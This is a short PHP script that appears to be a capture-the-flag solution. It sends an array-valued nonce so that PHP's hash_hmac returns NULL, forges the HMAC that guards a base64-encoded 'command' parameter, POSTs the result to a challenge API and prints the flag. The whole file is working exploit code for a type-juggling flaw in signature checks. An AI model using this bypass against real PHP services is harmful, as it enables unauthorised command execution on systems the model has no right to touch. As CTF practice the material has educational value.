<?php

$command = base64_encode(";");
$hash = hash_hmac('sha256',base64_decode($command), NULL);

$url = 'https://db.fishbowl.tech/api/vegan/rest';
$data = "action={$command}&hash={$hash}&nonce[]=1";

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => $data
    )
);

echo "Sending out the POST-request.\n";
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */ }

echo "Getting the flag:\n\n{$result}";

?>